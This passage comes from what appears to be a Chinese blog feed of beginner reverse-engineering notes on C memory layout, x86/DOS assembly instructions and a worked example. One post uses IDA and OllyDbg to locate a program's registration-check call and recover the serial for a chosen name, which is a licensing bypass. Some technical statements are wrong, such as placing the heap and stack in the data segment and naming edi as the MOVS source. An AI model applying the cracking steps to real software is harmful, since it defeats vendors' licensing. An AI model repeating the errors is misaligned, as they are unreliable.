class="line">声明如果有初始化，则就被当作定义。只有当extern声明位于函数外部的时候，才可以被初始化</span><br></pre></td></tr></table></figure><h1 id="4-内存布局"><a href="#4-内存布局" class="headerlink" title="4.内存布局"></a>4.内存布局</h1><p>1.一个程序上大部分是由BSS ，data ，text 段组冲的</p><ul><li>BSS（baa segment）通常用来存放程序中未初始化的全局变量的一快内存。BSS段属于静态内存分配</li><li>数据段（data segment）存放已经初始化的全局变量的一块内存区域。数据段属于静态内存分配</li><li>代码段（text segment）用来存放程序执行代码的一块内存区域。这部分程序的大小再运行之前就已经确定了，再内存区域中属于只读。在代码段中，也可能包含一些只读的常数变量。【这里就想从xx线指过去的才是xx段，本质上都是内存空间】</li></ul><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230506225036257.png" alt="image-20230506225036257" style="zoom:50%;" /><p>其中 .text为代码段，只读。.bss段包含程序中未初始化的全局变量，和static变量。data段包含:heap(堆),stack(栈),静态数据区</p><ul><li>堆：用于存放进程中被动态分配的内存段，大小不固定，可以扩张或者缩减。 当进程调用malloc等函数分配内存时，新分配的内存就被动态添加到<strong>堆</strong>上（堆被扩张）；当利⽤free等函数释放内存时，被释放的内存从<strong>堆</strong>中被剔除（堆被缩减）                                            </li><li>栈：存放程序临时创建的局部变量。也就是在函数{}中定义的变量，（不包括static声明的变量，static意味着在数据段中存放变量）</li><li>data段中的静态数据区存放的是程序中已经初始化的全局变量，静态变量，常量</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.c </span></span><br><span class="line"><span class="type">int</span> a = <span class="number">0</span>; <span class="comment">//全局初始化区 </span></span><br><span class="line"><span class="type">char</span> *p1; <span class="comment">//全局未初始化区 </span></span><br><span class="line">main() </span><br><span class="line">&#123; </span><br><span class="line"> <span class="type">static</span> <span class="type">int</span> c =<span class="number">0</span>； <span class="comment">//全局（静态）初始化区 </span></span><br><span class="line"> <span class="type">int</span> b; <span class="comment">//栈 </span></span><br><span class="line"> <span class="type">char</span> s[] = <span class="string">&quot;abc&quot;</span>; <span class="comment">//栈 </span></span><br><span class="line"> <span class="type">char</span> *p2; <span class="comment">//栈 </span></span><br><span class="line"> <span class="type">char</span> *p3 = <span class="string">&quot;123456&quot;</span>; <span class="comment">//&quot;123456\0&quot;在常量区，p3在栈上。 </span></span><br><span class="line"> p1 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">10</span>); </span><br><span class="line"> p2 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">20</span>); <span class="comment">//分配得来得10和20字节的区域就在堆区。 </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>实战寻找关键call（4）</title>
      <link href="/2023/05/06/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-4-%E5%AF%BB%E6%89%BE%E5%85%B3%E9%94%AEcall/"/>
      <url>/2023/05/06/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-4-%E5%AF%BB%E6%89%BE%E5%85%B3%E9%94%AEcall/</url>
      
        <content type="html"><![CDATA[<p>这里来实战一下下。这个程序</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230506165211911.png" alt="image-20230506165211911"></p><p>成功注册这个程序就可以了</p><p>首先我们点开这个程序，发现这个程序说：需要注册</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230506165259205.png" alt="image-20230506165259205"></p><p>查一个这个程序是如何写的…然后用IDA打开。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shift+f12</span><br></pre></td></tr></table></figure><p>先找找关键的字符串。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shitf + f</span><br></pre></td></tr></table></figure><p>搜索一下，找到这个程序的关键的位置，从上图中可以看出，有一个name 和 code 的字符串，我们就去搜索一下这个，然后点进去看看</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230506165533321.png" alt="image-20230506165533321"></p><p>点进去，然后看一看代码，emmm有点蒙蔽，交叉引用一下吧，看看图的样子。这里很明显能得到几个跳转。感觉就像是判断一样。</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230506191357700.png" alt="image-20230506191357700"></p><p>找到需要的位置按一下，有光标，然后tab一下，看看伪代码。大概就知道一点点。</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230506193907260.png" alt="image-20230506193907260"></p><p>用OD单步调试一下吧，静态的看确实脑壳大。</p><p>进入OD ， 全局中文搜索，智能搜索，找到这个name / code 的地方. 点过去看一看</p><p>通过IDA所看到的if 语句 ，是一个 双if 咱们大概找找位置，找到大if的位置，这个肯定是一个关键的位置。</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230506192353032.png" alt="image-20230506192353032"></p><p>大概知道这个地方，上面有一个call 一眼丁正是关键call。</p><p>让程序运行到这个看看，运行到这个上面这个红色的call的位置。然后单步调试一下。</p><p>然后再程序中的密钥的地方，输入一个name = abc 密码= 随便写的</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230506193255474.png" alt="image-20230506193255474"></p><p>在运行几步，发现….这里有一个ascii码值和这个ecx中的值也是这个奇奇怪怪的数字</p><p>这里盲猜测一下：它根据你的这个name 的值 通过某个算法算出一个奇奇怪怪的东西，然后用if去判断这个值和你输入的这个值是否相同，如果相同就成功。</p><p>所以这个信息就在这个地方，所以只需要让name = 你之前输入的[abc]密码就是这个一窜数字</p><p>现在大概能知道就可以了，后面还会学的。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>汇编语言深入讲解（3）</title>
      <link href="/2023/05/05/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-3-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E6%B7%B1%E5%85%A5%E8%AE%B2%E8%A7%A3/"/>
      <url>/2023/05/05/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-3-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E6%B7%B1%E5%85%A5%E8%AE%B2%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="1-X86汇编初步认识"><a href="#1-X86汇编初步认识" class="headerlink" title="1.X86汇编初步认识"></a>1.X86汇编初步认识</h1><p>这里来看两个例子</p><h2 id="加减乘除"><a href="#加减乘除" class="headerlink" title="加减乘除"></a>加减乘除</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">ASSUME CS:CODES,DS:DATAS ;关联一下啦</span><br><span class="line"></span><br><span class="line">DATAS SEGMENT ;定义⼀个DATAS段</span><br><span class="line">X DW 3 ;给字变量X赋值，X占16位</span><br><span class="line">Y DW 2 ;给字变量Y赋值，Y占16位</span><br><span class="line">STR1 DB &#x27;X = $&#x27; ;⽤于输出的表达式字符串，下同理</span><br><span class="line">STR2 DB &#x27;Y = $&#x27;</span><br><span class="line">STR3 DB &#x27;X + Y = $&#x27;</span><br><span class="line">STR4 DB &#x27;X - Y = $&#x27;</span><br><span class="line">STR5 DB &#x27;X * Y = $&#x27;</span><br><span class="line">STR6 DB &#x27;X / Y = $&#x27; </span><br><span class="line">STR7 DB &#x27;...$&#x27; ;余数的表达形式，如：5/2=2...1 </span><br><span class="line">DATAS ENDS ;DATAS段结束</span><br><span class="line"></span><br><span class="line">CODES SEGMENT ;定义⼀个CODES段</span><br><span class="line">START: ;程序开始标号处</span><br><span class="line">MOV AX,DATAS ;先将段DATAS中⽴即数存到通⽤寄存器AX中作为中转</span><br><span class="line">MOV DS,AX ;将⽴即数送到段寄存器DS中</span><br><span class="line"> </span><br><span class="line">;输出&quot;X = &quot;</span><br><span class="line">LEA DX,STR1 ;调⽤字符串STR1开始有效地址（偏移地址），存放在寄存器DX中</span><br><span class="line">MOV AH,09H ;调⽤DOS系统9号功能：显示字符串</span><br><span class="line">INT 21H ;调⽤DOS功能中断</span><br><span class="line">;输出X的值</span><br><span class="line">MOV DX,X ;将X的值存放在DX寄存器中</span><br><span class="line">ADD DL,&#x27;0&#x27; ;把数字变成字符输出，因为汇编中只能输出字符；0的ASCII值是30H，数字加上&#x27;0&#x27;后变为字符</span><br><span class="line">MOV AH,02H ;调⽤DOS系统的02号功能：显示⼀个字符</span><br><span class="line">INT 21H ;调⽤DOS功能中断</span><br><span class="line">;输出回⻋换⾏</span><br><span class="line">MOV DL,10 ;输出回⻋换⾏，回⻋键ACSII值为10</span><br><span class="line">MOV AH,02H ;调⽤DOS系统的02号功能：显示⼀个字符</span><br><span class="line">INT 21H ;调⽤DOS功能中断</span><br><span class="line"> </span><br><span class="line">;输出&quot;Y = &quot;</span><br><span class="line">LEA DX,STR2 ;调⽤字符串STR2开始有效地址（偏移地址），存放在寄存器DX中</span><br><span class="line">MOV AH,09H ;调⽤DOS系统9号功能：显示字符串</span><br><span class="line">INT 21H ;调⽤DOS功能中断</span><br><span class="line">;输出Y的值</span><br><span class="line">MOV DX,Y ;将Y的值存放在DX寄存器中</span><br><span class="line">ADD DL,&#x27;0&#x27; ;把数字变成字符输出，因为汇编中只能输出字符；0的ASCII值是30H，数字加上&#x27;0&#x27;后变为字符</span><br><span class="line">MOV AH,02H ;调⽤DOS系统的02号功能：显示⼀个字符</span><br><span class="line">INT 21H ;调⽤DOS功能中断</span><br><span class="line">;输出回⻋换⾏</span><br><span class="line">MOV DL,10 ;输出回⻋换⾏，回⻋键ACSII值为10</span><br><span class="line">MOV AH,02H ;调⽤DOS系统的02号功能：显示⼀个字符</span><br><span class="line">INT 21H ;调⽤DOS功能中断</span><br><span class="line"> </span><br><span class="line">;输出&quot;X + Y = &quot;</span><br><span class="line">LEA DX,STR3 ;调⽤字符串STR3开始有效地址（偏移地址），存放在寄存器DX中</span><br><span class="line">MOV AH,09H ;调⽤DOS系统9号功能：显示字符串</span><br><span class="line">INT 21H ;调⽤DOS功能中断</span><br><span class="line">;输出X+Y的值</span><br><span class="line">MOV DX,X ;将X的值存放在DX中</span><br><span class="line">ADD DX,Y ;将X和Y相加，结果存放在DX中</span><br><span class="line">ADD DL,&#x27;0&#x27; ;把数字变成字符输出，因为汇编中只能输出字符；0的ASCII值是30H，数字加上&#x27;0&#x27;后变为字符</span><br><span class="line">MOV AH,02H ;调⽤DOS系统的02号功能：显示⼀个字符</span><br><span class="line">INT 21H ;调⽤DOS功能中断</span><br><span class="line">;输出回⻋换⾏</span><br><span class="line">MOV DL,10 ;输出回⻋换⾏，回⻋键ACSII值为10</span><br><span class="line">MOV AH,02H ;调⽤DOS系统的02号功能：显示⼀个字符</span><br><span class="line">INT 21H ;调⽤DOS功能中断</span><br><span class="line"> </span><br><span class="line">;输出&quot;X - Y = &quot;</span><br><span class="line">LEA DX,STR4 ;调⽤字符串STR4开始有效地址（偏移地址），存放在寄存器DX中</span><br><span class="line">MOV AH,09H ;调⽤DOS系统9号功能：显示字符串</span><br><span class="line">INT 21H ;调⽤DOS功能中断</span><br><span class="line">;输出X-Y的值</span><br><span class="line">MOV DX,X ;将X的值存放在DX中</span><br><span class="line">SUB DX,Y ;将X和Y相减，结果存放在DX中</span><br><span class="line">ADD DL,&#x27;0&#x27; ;把数字变成字符输出，因为汇编中只能输出字符；0的ASCII值是30H，数字加上&#x27;0&#x27;后变为字符</span><br><span class="line">MOV AH,02H ;调⽤DOS系统的02号功能：显示⼀个字符</span><br><span class="line">INT 21H ;调⽤DOS功能中断</span><br><span class="line">;输出回⻋换⾏</span><br><span class="line">MOV DL,10 ;输出回⻋换⾏，回⻋键ACSII值为10</span><br><span class="line">MOV AH,02H ;调⽤DOS系统的02号功能：显示⼀个字符</span><br><span class="line">INT 21H ;调⽤DOS功能中断</span><br><span class="line"> </span><br><span class="line">;输出&quot;X * Y = &quot;</span><br><span class="line">LEA DX,STR5 ;调⽤字符串STR5开始有效地址（偏移地址），存放在寄存器DX中</span><br><span class="line">MOV AH,09H ;调⽤DOS系统9号功能：显示字符串</span><br><span class="line">INT 21H ;调⽤DOS功能中断</span><br><span class="line">;输出X*Y的值</span><br><span class="line">MOV AX,X ;MUL乘法指令中⼀个乘数在AL寄存器中</span><br><span class="line">MUL Y ;Y为另⼀个乘数，X*Y的结果存放在了AX寄存器中</span><br><span class="line">MOV DX,AX ;将AX中的乘积内容送到DX中⽤于输出</span><br><span class="line">ADD DL,&#x27;0&#x27; ;把数字变成字符输出，因为汇编中只能输出字符；0的ASCII值是30H，数字加上&#x27;0&#x27;后变为字符</span><br><span class="line">MOV AH,02H ;调⽤DOS系统的02号功能：显示⼀个字符</span><br><span class="line">INT 21H ;调⽤DOS功能中断</span><br><span class="line">;输出回⻋换⾏</span><br><span class="line">MOV DL,10 ;输出回⻋换⾏，回⻋键ACSII值为10</span><br><span class="line">MOV AH,02H ;调⽤DOS系统的02号功能：显示⼀个字符</span><br><span class="line">INT 21H ;调⽤DOS功能中断</span><br><span class="line">;输出&quot;X / Y = &quot;</span><br><span class="line">LEA DX,STR6 ;调⽤字符串STR6开始有效地址（偏移地址），存放在寄存器DX中</span><br><span class="line">MOV AH,09H ;调⽤DOS系统9号功能：显示字符串</span><br><span class="line">INT 21H ;调⽤DOS功能中断</span><br><span class="line">;输出X/Y的商值</span><br><span class="line">XOR DX,DX ;做16位除法前需要将DX清零</span><br><span class="line">MOV AX,X ;DIV除法指令中16位被除数在AX寄存器中</span><br><span class="line">DIV Y ;Y为除数，X/Y的结果16位商存放在AX中，余数存放在DX中，(如果是8位，商存放在AL中,余数在AH中)</span><br><span class="line">MOV DX,AX ;将AX中的商值内容送到DX中⽤于输出</span><br><span class="line">ADD DL,&#x27;0&#x27; ;把数字变成字符输出，因为汇编中只能输出字符；0的ASCII值是30H，数字加上&#x27;0&#x27;后变为字符</span><br><span class="line">MOV AH,02H ;调⽤DOS系统的02号功能：显示⼀个字符</span><br><span class="line">INT 21H ;调⽤DOS功能中断</span><br><span class="line">;输出&quot;...&quot;</span><br><span class="line">LEA DX,STR7 ;调⽤字符串STR7开始有效地址（偏移地址），存放在寄存器DX中</span><br><span class="line">MOV AH,09H ;调⽤DOS系统9号功能：显示字符串</span><br><span class="line">INT 21H ;调⽤DOS功能中断</span><br><span class="line">;输出X/Y的余数值</span><br><span class="line">XOR DX,DX ;由于DL中值已被覆盖，重新进⾏⼀次除法运算</span><br><span class="line">MOV AX,X ;DIV除法指令中16位被除数在AX寄存器中</span><br><span class="line">DIV Y ;Y为除数，X/Y的结果16位商存放在AX中，余数存放在DX中，(如果是8位，商存放在AL中,余数在AH中)</span><br><span class="line">ADD DL,&#x27;0&#x27; ;把数字变成字符输出，因为汇编中只能输出字符；0的ASCII值是30H，数字加上&#x27;0&#x27;后变为字符</span><br><span class="line">MOV AH,02H ;调⽤DOS系统的02号功能：显示⼀个字符</span><br><span class="line">INT 21H ;调⽤DOS功能中断</span><br><span class="line"> </span><br><span class="line">MOV AH,4CH ;调⽤DOS系统4C号功能：结束程序</span><br><span class="line">INT 21H ;调⽤DOS功能中断</span><br><span class="line">CODES ENDS ;CODES段结束</span><br><span class="line"> END START ;汇编程序运⾏结束</span><br></pre></td></tr></table></figure><p>其实这里面的代码大部分都是认识的</p><p>这里来简单的分析几个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;输出&quot;X = &quot;</span><br><span class="line">LEA DX,STR1 ;调⽤字符串STR1开始有效地址（偏移地址），存放在寄存器DX中</span><br></pre></td></tr></table></figure><ul><li>lea 肯定是一个指令咯–他得到的是数据的偏移地址，和offset不一样的是：offset是伪指令，为什么会使用这个DX呢？这个神仙来了也不知道，秘密都藏在下面的中断中，肯定这个中断中的参数是指定了DX【我也没查，忙猜的，猜测下面的第九号中断遇到$就停】</li></ul><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230506160341028.png" alt="image-20230506160341028"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MOV AH,09H ;调⽤DOS系统9号功能：显示字符串</span><br><span class="line">INT 21H ;调⽤DOS功能中断</span><br></pre></td></tr></table></figure><ul><li><p>这里就是调用一个中断的过程，STR1 DB ‘X = $’     ;⽤于输出的表达式字符串，下同理</p></li><li><p>emmm 这个不太懂，这个 $ 符号感觉就和C语言中的占位符差不多，姑且这么认为吧。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MOV DL,10 ;输出回⻋换⾏，回⻋键ACSII值为10</span><br></pre></td></tr></table></figure><ul><li>都说啦，回车的ACSII是10，配合着下面的中断就能回车啦</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">;输出Y的值</span><br><span class="line">MOV DX,Y ;将Y的值存放在DX寄存器中</span><br><span class="line">ADD DL,&#x27;0&#x27; ;把数字变成字符输出，因为汇编中只能输出字符；0的ASCII值是30H，数字加上&#x27;0&#x27;后变为字符</span><br><span class="line">MOV AH,02H ;调⽤DOS系统的02号功能：显示⼀个字符</span><br><span class="line">INT 21H ;调⽤DOS功能中断</span><br></pre></td></tr></table></figure><ul><li>这里中间add dl ,’0’看似加的是0，其实暗藏玄机，其实加的是ASCII码，也就是30h，看下面这三张图片你会更清楚</li></ul><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230506160535772.png" alt="image-20230506160535772"></p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230506160633074.png" alt="image-20230506160633074"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DIV Y ;Y为除数，X/Y的结果16位商存放在AX中，余数存放在DX中，(如果是8位，商存放在AL中,余数在AH中)</span><br></pre></td></tr></table></figure><ul><li>这里是div 指令，详细介绍可以去看8086汇编。里面肯定讲过</li></ul><p>ok 言归正传。</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230506160718324.png" alt="image-20230506160718324"></p><p>发现这里生成的exe文件其实不是PE文件。用IDA pro 打开就可以看到它的反汇编的代码。这里就不累赘了</p><h2 id="一个windows程序的汇编语言逆向"><a href="#一个windows程序的汇编语言逆向" class="headerlink" title="一个windows程序的汇编语言逆向"></a>一个windows程序的汇编语言逆向</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> APIENTRY _tWinMain(</span><br><span class="line"> HINSTANCE hInstance,</span><br><span class="line"> HINSTANCE hPrevInstance,</span><br><span class="line"> LPTSTR lpCmdLine,</span><br><span class="line"> <span class="type">int</span> nCmdShow)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">if</span>(<span class="built_in">lstrcmp</span>(lpCmdLine, _T(<span class="string">&quot;2012&quot;</span>)) == <span class="number">0</span>)&#123;</span><br><span class="line"> <span class="built_in">MessageBox</span>(<span class="built_in">GetActiveWindow</span>(),</span><br><span class="line"> _T(<span class="string">&quot;Hello! 2012&quot;</span>), _T(<span class="string">&quot;MESSAGE&quot;</span>), MB_OK);</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="built_in">MessageBox</span>(<span class="built_in">GetActiveWindow</span>(),</span><br><span class="line"> _T(<span class="string">&quot;Hello! Windows&quot;</span>), _T(<span class="string">&quot;MESSAGE&quot;</span>), MB_OK);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行这个程序</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230506160844833.png" alt="image-20230506160844833"></p><p>看到的是弹出的 hello windows。</p><p>但是我们看这个源代码哈，是可以弹出Hello! 2012的emmm 我这里看不懂代码。</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230506160838139.png" alt="image-20230506160838139"></p><p>看到的是 在cmd 中 运行这个程序，并且有一个2012 就会弹出这个窗口</p><p>真实中，我们是看不到源程序代码的，所以这里我们去用IDA反汇编一下</p><p>进入用IDA打开后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">按下空格健</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230506160831172.png" alt="image-20230506160831172"></p><p>看到这里其实是有2个分支的。现在就去看看这个分支语句如何才能满足条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">再次按下空格</span><br></pre></td></tr></table></figure><p>就能看到相对应的汇编代码啦</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230506160823715.png" alt="image-20230506160823715"></p><p>其实这里简单的看一下，所以在传入2012的时候就能进入宁外一个分支。</p><p>当然也可以F5来看看伪代码</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230506160814479.png" alt="image-20230506160814479"></p><p>okokokokok ，上面我们简单的介绍了2个汇编代码和反汇编之后的样子。现在我们来学正儿八经的</p><h1 id="2-常用的汇编指令"><a href="#2-常用的汇编指令" class="headerlink" title="2.常用的汇编指令"></a>2.常用的汇编指令</h1><p>首先这些指令都可以在Masm的集成器中去学习，下面我们简单介绍一下逆向常用的指令</p><h2 id="MOV"><a href="#MOV" class="headerlink" title="MOV"></a>MOV</h2><p>移动</p><p>要注意的就是，前后俩个东西的宽度要一样</p><h2 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h2><p>加法</p><p>也知道，宽度一样</p><h2 id="SUB"><a href="#SUB" class="headerlink" title="SUB"></a>SUB</h2><p>减法</p><h2 id="AND"><a href="#AND" class="headerlink" title="AND"></a>AND</h2><p>按位与—-&gt;&amp;</p><p>【只要有一个0，就是0】</p><h2 id="OR"><a href="#OR" class="headerlink" title="OR"></a>OR</h2><p>按位或—-&gt;||</p><p>【只要有一个1就是1】</p><h2 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h2><p>异或—–&gt; ^</p><p>【一样就是0，不一样就是1】</p><h2 id="NOT"><a href="#NOT" class="headerlink" title="NOT"></a>NOT</h2><p>非—–&gt;~</p><p>【相当于取反吧  0变成1，1变成0】</p><h2 id="MOVS"><a href="#MOVS" class="headerlink" title="MOVS"></a>MOVS</h2><p>数据传送，只能内存传内存。</p><p>movs edi指定的内存地址,esi指定的内存地址。在传送的时候默认用的是esi和edi寄存器，并且用后esi和edi的值会自增和自减去。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MOVS BYTE PTR ES:[EDI], BYTE PTR DS:[ESI] <span class="comment">//简写为：MOVSB</span></span><br><span class="line">MOVS WORD PTR ES:[EDI], WORD PTR DS:[ESI] <span class="comment">//简写为：MOVSW</span></span><br><span class="line">MOVS DWORD PTR ES:[EDI], DWORD PTR DS:[ESI] <span class="comment">//简写为：MOVSD</span></span><br></pre></td></tr></table></figure><p>在使用MOVS的时候，首先要把esi和edi的值改为相对应的内存地址。</p><p>edi中放的是源数据地址，edi中放的是将要传送到哪里的地址。</p><p>edi和esi中的值，是根据数据宽度来自动增加的。B-&gt;1，W-&gt;2，D-&gt;4</p><p>注意：当flag寄存器中，DF=0的时候，esi和edi自增，DF=1的时候，esi和edi自减</p><h2 id="STOS"><a href="#STOS" class="headerlink" title="STOS"></a>STOS</h2><p>表示将：AL/AX/EAX的值存储到edi指定的内存地址中。</p><p>同样的,edi寄存器的值会自动增加或者减少。还是取决于DF位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">STOS BYTE PTR ES:[EDI] //简写为：STOSB</span><br><span class="line">STOS WORD PTR ES:[EDI] //简写为：STOSW</span><br><span class="line">STOS DWORD PTR ES:[EDI] //简写为：STOSD</span><br></pre></td></tr></table></figure><h2 id="REP"><a href="#REP" class="headerlink" title="REP"></a>REP</h2><p>表示循环</p><p>rep movs  或者  rep stos</p><p>表示循环执行movs指令或者stos指令。循环的次数取决于ecx中的值。每次执行，ecx寄存器的值都会自动减1。知道0，就不在循环</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">REP MOVSB</span><br><span class="line">REP MOVSW</span><br><span class="line">REP MOVSD</span><br><span class="line">REP STOSB</span><br><span class="line">REP STOSW</span><br><span class="line">REP STOSD</span><br></pre></td></tr></table></figure><hr><p>堆栈相关的指令</p><p>首先，我们要知道的是：站指针是从大到小的。回想一下8086中，栈指针永远都是指向栈顶的，也就是下面的【内存大的位置】。和盒子一样，盒子的底部就能看作是栈顶指针，永远都指向底部，当我们向盒子里面放入书后，就相当于底部往上抬了一本书的位置，而抬起来位置的大小也取决于书的大小，也就是数据宽度。</p><h2 id="PUSH"><a href="#PUSH" class="headerlink" title="PUSH"></a>PUSH</h2><p>压入栈。</p><p>PUSH 通用寄存器/内存地址/立即数</p><p>把里面的值放入栈指针所指向的内存地址</p><p>用了过后，esp会减小，比如：esp-4，也就是往上抬了</p><h2 id="POP"><a href="#POP" class="headerlink" title="POP"></a>POP</h2><p>释放数据</p><p>POP 